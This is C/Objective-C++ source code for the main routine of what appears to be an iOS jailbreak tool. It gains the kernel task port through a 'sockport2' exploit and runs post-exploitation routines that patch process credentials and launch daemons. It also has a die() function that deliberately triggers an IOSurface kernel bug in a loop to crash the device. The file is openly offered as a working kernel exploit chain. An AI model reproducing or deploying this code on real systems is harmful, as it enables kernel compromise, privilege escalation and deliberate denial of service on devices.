#include <errno.h>
#include <stdbool.h>
#include <stdlib.h>             // exit
#include <string.h>             // strerror, strncmp
#include <unistd.h>             // access, sleep
#include <sys/sysctl.h>         // sysctlbyname
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>
#include <curl/curl.h>
#include <liboffsetfinder64/liboffsetfinder64.hpp>

#include "dl.h"

extern "C"
{
#   include "common.h"
#   include "offsets.h"
#   include "iokit.h"
#   include "exploit.h"
//#   include "v0rtex.h"

extern SInt32 REALGANGSHIT_CFUserNotificationDisplayAlert(
    CFTimeInterval timeout,
    CFOptionFlags flags,
    CFURLRef iconURL,
    CFURLRef soundURL,
    CFURLRef localizationURL,
    CFStringRef alertHeader,
    CFStringRef alertMessage,
    CFStringRef defaultButtonTitle,
    CFStringRef alternateButtonTitle,
    CFStringRef otherButtonTitle,
    CFOptionFlags *responseFlags) __asm__("_CFUserNotificationDisplayAlert");

}

__attribute__((noreturn)) static void die()
{
    // open user client
    CFMutableDictionaryRef matching = IOServiceMatching("IOSurfaceRoot");
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, matching);
    io_connect_t connect = 0;
    IOServiceOpen(service, mach_task_self(), 0, &connect);

    // add notification port with same refcon multiple times
    mach_port_t port = 0;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    uint64_t references;
    uint64_t input[3] = {0};
    input[1] = 1234;  // keep refcon the same value
    while (1)
        IOConnectCallAsyncStructMethod(connect, 17, port, &references, 1, input, sizeof(input), NULL, NULL);
}

CFOptionFlags popupTimeout(CFStringRef title, CFStringRef text, CFStringRef buttonOne, CFStringRef buttonTwo, CFStringRef buttonThree, CFTimeInterval timeout)
{
    CFOptionFlags flags;
    REALGANGSHIT_CFUserNotificationDisplayAlert(timeout, 0, NULL, NULL, NULL, title, text, buttonOne, buttonTwo, buttonThree, &flags);
    return flags & 0x3;
}

extern "C" CFOptionFlags popup(CFStringRef title, CFStringRef text, CFStringRef buttonOne, CFStringRef buttonTwo, CFStringRef buttonThree)
{
    return popupTimeout(title, text, buttonOne, buttonTwo, buttonThree, 0);
}

#define min(a, b) ((a) < (b) ? (a) : (b))

static bool useMeridian(void)
{
    // 0 uninit
    // 1 doubleH3lix
    // 2 Meridian
    static int state = 0;
    if(state == 0)
    {
        char buf[0x20] = { 0 };
        size_t len = sizeof(buf);
        int r = sysctlbyname("hw.machine", buf, &len, NULL, 0);
        if(r != 0)
        {
            LOG("sysctlbyname: %s", strerror(errno));
            exit(-1);
        }
        LOG("machine: %-*s", (int)len, buf);
        if(strncmp("iPhone9,", buf, min(8, len)) == 0 || strncmp("iPad7,", buf, min(6, len)) == 0) // No choice
        {
            state = 2;
        }
        else if(access("/.cydia_no_stash", F_OK) == 0) // Already jailbroken, detect bootstrap
        {
            state = access("/meridian", F_OK) == 0 ? 2 : 1;
        }
        else // First time installation, ask user
        {
            state = 1;
        }
    }
    return state == 2;
}

// doubleH3lix
extern kern_return_t cb(task_t tfp0_, kptr_t kbase, void *data);
extern void runLaunchDaemons(void);
// Meridian
extern "C"
{
    extern offsets_t *offsets;
    extern kern_return_t callback(task_t kern_task, kptr_t kbase, void *cb_data);
    extern int makeShitHappen(void);
}

typedef struct
{
    task_t ktask;
    kptr_t kbase;
} fuck_t;

static kern_return_t fuck(task_t ktask, kptr_t kbase, void *data)
{
    fuck_t *f = (fuck_t*)data;
    f->ktask = ktask;
    f->kbase = kbase;
    return KERN_SUCCESS;
}

int main(void)
{
    @autoreleasepool
    {
        LOG("we out here\n");
        LOG("v1.17\n");

        tihmstar::offsetfinder64 fi("/System/Library/Caches/com.apple.kernelcaches/kernelcache");

        LOG("running sockport2...");
        mach_port_t kernel_task = get_tfp0();
        uint64_t kernel_base = get_kernel_base(kernel_task);

        /*
        offsets_t *off = NULL;
        try
        {
            off = get_offsets(&fi);
        }
        catch (tihmstar::exception &e)
        {
            LOG("Offset error: %s [%u]", e.what(), e.code());
            return -1;
        }
        catch (std::exception &e)
        {
            LOG("Fatal offset error: %s", e.what());
            return -1;
        }
        LOG("running v0rtex...");
        fuck_t fu;
        if(v0rtex(off, &fuck, &fu) != KERN_SUCCESS)
        {
            LOG("Kernel exploit failed, goodbye...");
            popupTimeout(CFSTR("Kernel exploit failed"), CFSTR("Your device will reboot now..."), CFSTR("OK"), NULL, NULL, 5);
            die();
            return -1;
        }
        */

        LOG("Exploit done");

        popupTimeout(CFSTR("Jailbreak"), CFSTR("Kernel pwned!"), CFSTR("Ok"), NULL, NULL, 5);

        CURLcode r = curl_global_init(CURL_GLOBAL_ALL);
        if(r != 0)
        {
            LOG("curl_global_init: %d", r);
            return -1;
        }

        if(useMeridian())
        {
            offsets_t *off = NULL;
            offsets = off;
            kern_return_t ret = callback(kernel_task, kernel_base, NULL);
            if(ret != KERN_SUCCESS)
            {
                LOG("callback: %x", ret);
                return -1;
            }
            makeShitHappen();
        }
        else
        {
            kern_return_t ret = cb(kernel_task, kernel_base, &fi);
            if(ret != KERN_SUCCESS)
            {
                LOG("cb: %x", ret);
                return -1;
            }
            runLaunchDaemons();
            _wk64(ourproc + 0x100, orig_ucred);
            setuid(orig_uid);
        }

        curl_global_cleanup();
    }
    return -1;
}
